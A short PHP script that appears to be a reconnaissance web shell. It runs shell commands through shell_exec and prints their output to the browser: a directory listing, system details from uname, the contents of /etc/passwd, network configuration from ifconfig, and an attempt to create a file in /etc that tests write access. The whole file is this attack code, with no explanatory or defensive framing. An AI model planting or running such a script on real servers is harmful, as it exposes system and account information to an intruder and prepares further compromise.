<?php
$output = shell_exec('ls -lart');
echo "<pre>$output</pre>";

$output = shell_exec('uname -a');
echo "<pre>$output</pre>";

$output = shell_exec('cat /etc/passwd');
echo "<pre>$output</pre>";


echo "<pre>###############</pre>";
$output = shell_exec('ifconfig');
echo "<pre>$output</pre>";


$output = shell_exec('touch /etc/test.sh');
$output = shell_exec('ls /etc/test.sh');
echo "<pre>$output</pre>";

?>
